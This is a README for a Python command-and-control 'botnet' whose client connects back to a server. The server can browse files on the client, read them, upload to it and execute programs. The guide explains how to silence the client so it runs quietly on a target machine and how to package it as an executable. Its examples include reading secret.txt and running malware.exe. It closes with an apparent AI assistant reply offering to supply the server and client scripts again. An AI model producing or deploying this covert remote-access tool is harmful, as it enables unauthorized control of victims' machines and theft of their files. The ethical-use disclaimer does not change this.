````markdown
# CLI-Based Botnet Framework  
*Ethical Hacking & Research Tool*

---

## ⚠️ Disclaimer

This tool is intended **only for ethical hacking, penetration testing, and educational research** on devices and networks you own or have explicit permission to test. Unauthorized usage is illegal and unethical.

---

## 🛠️ Project Overview

This project provides a **simple command-line interface (CLI) based botnet** for managing multiple client machines remotely using Python sockets.  

- The **server** (`server.py`) listens for incoming client connections and allows you to control them from a CLI.  
- The **client** (`client.py`) connects back to the server and executes commands sent by the server.  

### Key Features

- Manage multiple clients simultaneously  
- Navigate client file systems (`ls`, `cd`)  
- Read files remotely (`read`)  
- Upload files to clients (`upload`)  
- Execute programs on clients (`exec`)  
- Interactive shell per client for easy command control  

---

## 📦 Prerequisites

- Python 3.10 or newer  
- Basic knowledge of Python and command line  
- Network environment where server and clients can connect (open firewall ports)  

---

## 🔧 Installation and Setup

### 1. Clone or Download Repository

```bash
git clone https://github.com/yourusername/cli-botnet.git
cd cli-botnet
````

### 2. (Optional) Create Virtual Environment

```bash
python -m venv .venv
# Activate virtual environment:
# Windows:
.\.venv\Scripts\activate
# Linux/macOS:
source .venv/bin/activate
```

### 3. Install Requirements

```bash
pip install -r requirements.txt
```

---

## ⚙️ Configuration

### Change Server IP and Port in Client

In `client.py`, find and update:

```python
host = "127.0.0.1"  # Change to your server IP or hostname reachable from client
port = 9000         # Port must match server's listening port
```

If your server is on a public VPS or LAN, replace `127.0.0.1` accordingly.

---

## 🚀 Running the Server

Start the server from the terminal:

```bash
python server.py
```

The server will:

* Bind to all network interfaces (`0.0.0.0`) by default
* Listen on port 9000 (changeable in the code)
* Wait for clients to connect

**Sample output:**

```
[+] Server listening on 0.0.0.0:9000
[+] Waiting for client connections...
```

---

## 🚀 Running the Client

On the target machine, run:

```bash
python client.py
```

The client attempts to connect to the server at the specified IP and port.

If connection succeeds:

```
[+] Connected to server at 192.168.1.100:9000
```

The client then waits silently for commands from the server.

---

## 🖥 Server Command-Line Interface (CLI) Usage

After clients connect, the server CLI lets you manage them with commands.

### Server Prompt

```
> 
```

---

### Server Commands

| Command       | Description                        | Usage Example |
| ------------- | ---------------------------------- | ------------- |
| `list`        | List all connected clients         | `list`        |
| `select <id>` | Select client to interact with     | `select 0`    |
| `help`        | Show help message                  | `help`        |
| `exit`        | Shutdown server and disconnect all | `exit`        |

---

### Viewing Connected Clients

```bash
> list
[0] 192.168.1.5
[1] 10.0.0.12
```

Here, `[0]` and `[1]` are client IDs used in the `select` command.

---

### Interacting with a Client

Select a client by ID to enter an interactive shell:

```bash
> select 0
Connected to client 0 (192.168.1.5)
Type commands or 'exit' to return.
client[0]> 
```

---

### Client Shell Commands

| Command               | Description                               | Usage Example              |
| --------------------- | ----------------------------------------- | -------------------------- |
| `ls`                  | List files and directories in current dir | `ls`                       |
| `cd <directory>`      | Change directory                          | `cd Documents`             |
| `read <filename>`     | Read a file's content (text or binary)    | `read secret.txt`          |
| `upload <local_path>` | Upload a local file to the client         | `upload C:\Users\file.txt` |
| `exec <filename>`     | Execute a file/program on the client      | `exec malware.exe`         |
| `exit`                | Exit client shell, return to server CLI   | `exit`                     |

---

### Client Shell Example Session

```
client[0]> ls
<DIR> Documents
<FILE> notes.txt

client[0]> cd Documents

client[0]> read report.docx
Binary file (first 100 bytes): b'504b0304...'

client[0]> upload C:\Users\Hassan\Desktop\tool.exe
Upload: Success

client[0]> exec tool.exe
Exec: Program started

client[0]> exit
Returning to server prompt...
>
```

---

## 🔄 Uploading Files Explained

* Use `upload <local_filepath>` on the server CLI client shell.
* The specified local file on the server machine is sent to the client.
* Client saves the file in its current working directory.
* Paths must be valid and accessible from the server machine.

---

## 🔇 Silencing Client Output (Optional)

To avoid the client printing info on the target machine:

* Open `client.py`.
* Comment out or remove all `print()` calls.
* This makes the client run quietly in the background.

---

## 📦 Packaging Client as Executable (`.exe`)

To run client machines without installing Python:

1. Install PyInstaller:

```bash
pip install pyinstaller
```

2. Create a standalone executable:

```bash
pyinstaller --onefile client.py
```

3. The executable will be available in the `dist/` folder as `client.exe`.

4. Use this `.exe` on client machines to run the botnet client without Python.

---

## 🔧 Troubleshooting & Tips

| Issue                         | Solution                                                       |
| ----------------------------- | -------------------------------------------------------------- |
| Connection refused            | Check IP/port, firewall, and network connectivity              |
| Clients not appearing in list | Ensure clients run with correct server IP/port                 |
| Commands not working          | Confirm server and client are using compatible Python versions |
| File uploads failing          | Verify local file path and permissions on server machine       |

---

## ⚖️ Ethical Usage Reminder

* Only use this tool on devices/networks you own or have explicit permission to test.
* Illegal or unauthorized use may lead to severe penalties.

---

## 💰 Donations

Support the project with Bitcoin donations:

```
bc1qyourwalletaddresshere
```

---

## 📜 License

MIT License - Free to use responsibly.

---

# `requirements.txt`

```txt
# No external dependencies required
```

---

## Contact / Issues

For help or issues, please open an issue on GitHub or contact the maintainer.

---

Thank you for using this tool responsibly!

```

---

If you want me to provide the final `server.py` and `client.py` scripts again to go with this README, just say!
```
